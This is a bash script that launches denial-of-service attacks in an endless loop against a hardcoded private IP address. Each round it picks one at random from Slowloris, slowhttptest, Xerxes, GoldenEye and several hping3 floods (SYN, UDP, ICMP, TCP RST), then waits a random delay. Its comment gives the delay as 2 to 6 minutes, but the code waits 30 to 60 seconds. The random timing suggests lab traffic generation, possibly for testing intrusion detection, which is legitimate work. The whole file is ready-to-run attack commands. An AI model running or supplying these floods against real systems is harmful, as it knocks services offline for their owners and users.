#!/bin/bash

# Target IP
TARGET_IP="192.168.36.1"

# Function to run Slowloris DoS attack
run_slowloris() {
    echo "Running Slowloris attack on $TARGET_IP..."
    slowloris $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Hping3 (TCP SYN flood)
run_hping3() {
    echo "Running Hping3 (SYN flood) on $TARGET_IP..."
    hping3 --flood -S $TARGET_IP -p 80 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run SYN flood attack using Hping3
run_synflood() {
    echo "Running SYN Flood on $TARGET_IP..."
    hping3 -i u40 -S -p 80 -c 100000 $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Slowhttptest (Slow HTTP DoS)
run_slowhttptest() {
    echo "Running Slowhttptest attack on $TARGET_IP..."
    slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -u http://$TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run UDP flood attack using Hping3
run_udpflood() {
    echo "Running UDP flood on $TARGET_IP..."
    hping3 --flood --udp $TARGET_IP -p 53 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Xerxes (HTTP DoS attack)
run_xerxes() {
    echo "Running Xerxes DoS attack on $TARGET_IP..."
    ./xerxes $TARGET_IP 80 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run GoldenEye (HTTP DoS attack)
run_goldeneye() {
    echo "Running GoldenEye DoS attack on $TARGET_IP..."
    python3 goldeneye.py http://$TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run ICMP Flood attack
run_icmp_flood() {
    echo "Running ICMP Flood on $TARGET_IP..."
    hping3 --flood --icmp $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run TCP RST Flood attack
run_rst_flood() {
    echo "Running TCP RST Flood on $TARGET_IP..."
    hping3 -R --flood $TARGET_IP -p 80 &
    sleep $((RANDOM % 6 + 5))
}

# Main function to run DoS/DDoS attacks at random intervals
main() {
    echo "Running DoS/DDoS attacks on $TARGET_IP..."

    # Array of attack functions (excluding leak-prone attacks)
    ATTACKS=(
        "run_slowloris" "run_hping3" "run_synflood" "run_slowhttptest"
        "run_udpflood" "run_xerxes" "run_goldeneye" "run_icmp_flood" 
        "run_rst_flood"
    )

    while true; do
        # Select a random attack
        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}

        # Execute the selected attack
        $ATTACK

        # Random delay between 2 to 6 minutes (120 to 360 seconds)
        RANDOM_DELAY=$((RANDOM % 31 + 30))
        echo "Waiting for $RANDOM_DELAY seconds before running another attack..."
        sleep $RANDOM_DELAY
    done
}

# Run the main function
main
